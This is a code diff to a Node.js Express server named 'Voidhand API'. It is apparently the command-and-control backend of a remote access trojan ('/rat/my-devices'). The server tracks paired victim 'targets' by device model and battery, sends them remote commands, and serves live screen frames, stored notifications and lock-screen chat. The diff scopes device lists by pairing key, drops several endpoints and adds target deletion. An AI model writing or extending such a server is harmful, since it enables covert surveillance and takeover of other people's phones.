@@ -63,7 +63,7 @@ app.post("/api/pair-target", async (req, res) => {
       id: deviceId,
       model: model || "Unknown",
       battery: battery || "?",
-      pairId,
+      pairId: pairId.toUpperCase(),
       status: "Online",
       lastSeen: new Date().toISOString(),
     };
@@ -74,57 +74,24 @@ app.post("/api/pair-target", async (req, res) => {
   }
 });
 
-app.post("/api/register-target", async (req, res) => {
-  try {
-    const d = req.body;
-    if (!d.id) return res.status(400).json({ error: "id required" });
-    d.lastSeen = new Date().toISOString();
-    await redis.set(`target:${d.id}`, d);
-    res.json({ status: "ok" });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.post("/api/heartbeat/:id", async (req, res) => {
-  try {
-    const id = req.params.id;
-    const t = await redis.get(`target:${id}`);
-    if (t) {
-      t.lastSeen = new Date().toISOString();
-      t.status = "Online";
-      if (req.body.battery) t.battery = req.body.battery;
-      await redis.set(`target:${id}`, t);
-    }
-    res.status(200).send("1");
-  } catch (e) {
-    res.status(500).send("0");
-  }
-});
-
-app.get("/api/list-targets", async (req, res) => {
-  try {
-    const keys = await redis.keys("target:*");
-    const targets = [];
-    for (const k of keys) {
-      targets.push(await redis.get(k));
-    }
-    res.json(targets);
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
 app.get("/rat/my-devices", async (req, res) => {
   try {
+    const { key } = req.query;
+    if (!key) return res.status(401).json({ valid: false });
+
     const now = Date.now();
-    const keys = await redis.keys("target:*");
+    const targetKeys = await redis.keys("target:*");
     const devices = [];
-    for (const k of keys) {
+
+    for (const k of targetKeys) {
       const t = await redis.get(k);
       if (!t) continue;
+
+      if (t.pairId !== key) continue;
+
       const seen = Date.parse(t.lastSeen || 0) || 0;
       const on = now - seen < 30000;
+
       devices.push({
         id: t.id,
         model: t.model || "Unknown",
@@ -133,13 +100,10 @@ app.get("/rat/my-devices", async (req, res) => {
         lastSeen: t.lastSeen,
       });
     }
-    
-    const pairKeys = await redis.keys("pair:*");
-    const pairId = pairKeys.length > 0 ? pairKeys[0].replace("pair:", "") : null;
 
     res.json({
       valid: true,
-      pairId,
+      pairId: key,
       devices,
       myDevicesCount: devices.length,
       totalDevices: devices.length,
@@ -158,7 +122,6 @@ app.post("/api/send-command", async (req, res) => {
     const { id, command, extra } = req.body;
     if (!id || !command)
       return res.status(400).json({ error: "id + command required" });
-
     const cmd = {
       targetId: id,
       command,
@@ -229,70 +192,16 @@ app.get("/api/live-frame/:id", async (req, res) => {
   }
 });
 
-app.post("/api/post-notification/:id", async (req, res) => {
+app.delete("/api/delete-target/:id", async (req, res) => {
   try {
     const id = req.params.id;
-    const notif = {
-      targetId: id,
-      ...req.body,
-      timestamp: new Date().toISOString(),
-    };
-    await redis.lpush(`notifs:${id}`, notif);
-    await redis.ltrim(`notifs:${id}`, 0, 99);
-    res.json({ status: "saved" });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.get("/api/get-notifications/:id", async (req, res) => {
-  try {
-    const notifs = await redis.lrange(`notifs:${req.params.id}`, 0, -1);
-    res.json(notifs);
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.get("/api/lock-chat/:id", async (req, res) => {
-  try {
-    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
-    res.json({ messages: msgs });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.post("/api/lock-chat/:id", async (req, res) => {
-  try {
-    const id = req.params.id;
-    const { from, text, msg } = req.body;
-    const chat = {
-      from: from || "owner",
-      text: text || msg || "",
-      time: new Date().toISOString(),
-    };
-    await redis.rpush(`chat:${id}`, chat);
-    await redis.ltrim(`chat:${id}`, -100, -1);
-    res.json({ status: "ok" });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.get("/api/lock-chat-all/:id", async (req, res) => {
-  try {
-    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
-    res.json({ messages: msgs });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-app.delete("/api/lock-chat/:id", async (req, res) => {
-  try {
-    await redis.del(`chat:${req.params.id}`);
-    res.json({ status: "cleared" });
+    await redis.del(`target:${id}`);
+    await redis.del(`cmd:${id}`);
+    await redis.del(`resp:${id}`);
+    await redis.del(`frame:${id}`);
+    await redis.del(`chat:${id}`);
+    await redis.del(`notifs:${id}`);
+    res.json({ status: "deleted" });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -329,4 +238,4 @@ if (require.main === module) {
   app.listen(PORT, "0.0.0.0", () =>
     console.log(`Voidhand API listening on :${PORT}`)
   );
-    }
+}
